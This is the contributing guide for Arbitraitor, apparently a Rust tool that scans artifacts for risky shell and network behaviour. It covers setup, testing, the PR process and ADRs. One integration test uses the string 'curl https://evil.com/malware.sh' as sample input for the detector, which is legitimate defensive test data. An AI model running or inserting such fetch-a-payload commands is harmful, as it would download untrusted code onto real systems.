# Contributing

Arbitraitor welcomes contributions from the community. This guide covers development setup, the PR process, and standards.

## Development setup

### Toolchain

Arbitraitor uses `mise` for toolchain management:

```sh
# Install mise if not already
curl https://mise.run | sh

# Install Rust toolchain and tools
mise install
```

Verify the setup:

```sh
rustc --version   # Should show Rust 2024 edition
cargo --version
mise current      # Should show configured versions
```

### Repository structure

```
arbitraitor/
├── crates/           # All workspace crates
├── book/             # mdBook documentation
├── docs/
│   └── adr/          # Architecture decision records
├── wit/              # WIT interface definitions
├── rules/            # YARA-X rule packs
└── schemas/          # JSON schemas
```

### Worktree discipline

Work in a temporary worktree, never on main:

```sh
git fetch origin
git worktree add ../arbitraitor-<task-slug> main
cd ../arbitraitor-<task-slug>
```

This keeps the main checkout clean and allows parallel work.

### Running tests

```sh
# All tests
cargo nextest run

# Specific crate
cargo nextest run -p arbitraitor-shell

# With coverage
cargo tarpaulin --workspace
```

### Pre-PR checks

Before opening a PR, run:

```sh
cargo fmt --check
cargo clippy --workspace --all-targets --all-features -- -D warnings
cargo check --workspace --all-targets --all-features
cargo nextest run
```

All checks must pass. If CI fails, fix the issue — do not disable checks.

## PR process

### Branch naming

Use `<type>/<short-slug>`:

```sh
git checkout -b feat/fetcher-trait
git checkout -b fix/store-digest-race
git checkout -b docs/mdbook-site
git checkout -b security/plugin-wasi-boundary
```

### Commit messages

The PR title uses Conventional Commits format (squash merge):

```
feat(fetch): enforce connected-peer address policy
fix(store): prevent release from stale artifact handle
docs(spec): define encoded HTTP artifact identity
security(plugin): reject undeclared WASI imports
```

### PR requirements

Every PR must include:

- **Problem and approach** — what changed and why
- **Linked issue** — use closing keywords (`Fixes #123`)
- **Security impact** — how this affects the threat model
- **Tests added** — what behavior is now covered
- **Documentation updated** — user-facing or architecture docs
- **Compatibility impact** — API, CLI, protocol changes

### Adversarial review

PRs created by automated agents require review from a different agent. The reviewer must attempt to break the implementation, verify security invariants hold, and check for edge cases.

### Small PRs

Keep PRs focused and reviewable. If a change is large, split it into stacked PRs:

```
feat/base-api      <- merge first
feat/fetcher-use   <- merge second
feat/store-use     <- merge third
```

## ADR process

Architecture decisions are recorded as ADRs (Architecture Decision Records) in `docs/adr/`.

When to write an ADR:

- Adding a production dependency with security implications
- Changing the trust model or execution context
- Choosing between approaches where reversal is expensive
- Adding or changing a plugin capability

ADR format:

```markdown
# ADR NNNN: Title

**Status:** Accepted | Proposed | Superseded | Rejected
**Date:** YYYY-MM-DD
**Issue:** #NN

## Context

Why this decision is needed.

## Decision

What was decided.

## Consequences

What follows from the decision.

## Alternatives considered

Options that were evaluated and rejected.

## References

Related specs, ADRs, or documentation.
```

## Testing strategy

### Unit tests

Every meaningful behavior gets a unit test:

```rust
#[test]
fn finding_aggregates_by_severity() {
    let findings = vec![
        Finding { severity: Severity::High, .. },
        Finding { severity: Severity::Low, .. },
        Finding { severity: Severity::High, .. },
    ];
    let aggregated = aggregate_by_severity(findings);
    assert_eq!(aggregated.high, 2);
    assert_eq!(aggregated.low, 1);
}
```

### Integration tests

Cross-crate interactions are tested via integration tests:

```rust
// tests/analysis_pipeline.rs
#[tokio::test]
async fn full_pipeline_with_shell_detector() {
    let artifact = test_artifact("curl https://evil.com/malware.sh");
    let result = Arbitraitor::new().inspect(artifact).await;
    assert!(result.findings.iter().any(|f| f.id == "network:curl"));
}
```

### Property tests

For functions with many input permutations:

```rust
proptest! {
    #[test]
    fn url_normalization_roundtrips(url: NormalizedUrl) {
        let serialized = url.to_string();
        let parsed: NormalizedUrl = serialized.parse().unwrap();
        prop_assert_eq!(url, parsed);
    }
}
```

### Test shapes

| Layer | Count | Speed |
|-------|-------|-------|
| Unit | Many | < 10ms each |
| Integration | Some | < 1s each |
| E2E | Few | seconds |

## Security-sensitive changes

Changes to these paths require extra scrutiny:

- `arbitraitor-fetch/` — transport, SSRF, TLS
- `arbitraitor-store/` — CAS, digest verification, release
- `arbitraitor-exec/` — execution broker
- `arbitraitor-plugin-host/` — Wasmtime runtime
- `wit/` — plugin interface definitions
- `Cargo.lock` — dependency supply chain

Security-sensitive changes require review from a code owner before merge.

## Code style

- Follow `cargo clippy --workspace --all-targets --all-features -- -D warnings`
- No `unwrap()` in production code
- Use `thiserror` for typed errors
- Use `tracing` for structured logging
- No `println!` in library crates
